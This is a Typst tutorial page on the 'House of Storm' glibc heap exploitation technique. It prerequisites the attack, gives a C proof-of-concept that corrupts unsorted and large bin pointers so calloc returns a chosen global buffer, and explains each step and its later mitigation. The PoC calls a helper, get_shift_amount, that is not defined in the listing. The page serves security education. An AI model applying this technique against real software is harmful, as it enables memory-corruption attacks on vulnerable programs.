#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Storm",
    description: "A powerful attack combining unsorted bin and large bin vulnerabilities to gain an arbitrary allocation, even without a size field at the target.",
    date: "2025-12-28",
    order: 52,
  ),
)<frontmatter>

= House of Storm

== Introduction

The "House of Storm" is an advanced heap exploitation technique that allows an attacker to obtain an arbitrary chunk from `malloc`, even at a memory location that does not contain a valid size field. It achieved this by combining two powerful primitives:
1.  **Unsorted Bin Attack**: Used to link a target address into the unsorted bin.
2.  **Large Bin Write-Where**: Used to write a "fake size" to that target address.

This attack is particularly notable because it can bypass the lack of a pre-existing size field at the target location. It was highly effective on glibc versions 2.26 through 2.28. In later versions, patches to the unsorted bin attack (specifically checking that `victim->bk->fd == victim`) have largely mitigated this specific technique.

== Prerequisites
- **Glibc 2.26 - 2.28**: The attack relies on the traditional unsorted bin behavior.
- **Write Primitives**: Ability to overwrite the `bk` pointer of an unsorted bin chunk and the `bk_nextsize` pointer of a large bin chunk.
- **Known Addresses**: Knowledge of the target memory address and the upper bits of a heap address (used to craft the fake size).
- **Tcache Exhaustion**: The tcache for the target allocation size must be full to ensure the allocator processes the unsorted bin.

== Example from `house_of_storm.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

char target[0x60]; 

int main(){
    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
	int* tcaches[7];

	unsorted_bin = malloc(0x4e8); 
	malloc(0x18); 

	int shift_amount = get_shift_amount(unsorted_bin);	
	size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
	alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; 

	if(alloc_size < 0x410){
		for(int i = 0; i < 7; i++) tcaches[i] = malloc(alloc_size);
		for(int i = 0; i < 7; i++) free(tcaches[i]);
	}

	large_bin = malloc(0x4d8); 
	malloc(0x18);

	free(large_bin);
	free(unsorted_bin);

	// Put large_bin into large bin
	malloc(0x4e8);
	free(unsorted_bin);

	fake_chunk = target - 0x10;

	// VULNERABILITY: Unsorted bin attack
	((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; 

	// VULNERABILITY: Large bin attack to forge size
	((size_t *)large_bin)[1] = (size_t)fake_chunk + 8; 
	((size_t *)large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; 

	ptr = calloc(alloc_size, 1);
	
	assert(ptr == target);
	return 0;
}
```

== Attack Flow Explained

=== 1. Heap Feng Shui
The attacker places one chunk in the **Unsorted Bin** and a slightly smaller chunk (belonging to the same size bin) in the **Large Bin**.

=== 2. Creating a Fake Size (Large Bin Attack)
The large bin write-where primitive is used to write a heap address to a location slightly before the target address. By carefully misaligning this write, the attacker ensures that the non-zero bytes of the heap address overlap with the `size` field of the intended `fake_chunk`.

For example, if the heap address is `0x55555555b000`, writing it to `target - 5` might result in `0x55` or `0x5555` appearing as the size at `target - 0x8`.

=== 3. Linking the Fake Chunk (Unsorted Bin Attack)
The unsorted bin's `bk` pointer is overwritten with the `fake_chunk` address. When `malloc` (or `calloc`) processes the unsorted bin, it will eventually see our `fake_chunk` as a candidate.

=== 4. The Allocation
When the allocator checks the `fake_chunk` in the unsorted bin:
1.  It finds the "size" we created using the Large Bin attack.
2.  If the requested allocation size matches this fake size (and the chunk passes basic arena/mmap checks), glibc removes the chunk from the bin and returns it to the user.

== Security Implications
House of Storm is a devastating technique because it allows for arbitrary memory allocation with relatively few primitives, provided the attacker can predict heap alignments and has a way to corrupt bin pointers. It highlights the danger of "stashing" and the lack of robust integrity checks in older glibc bin management.
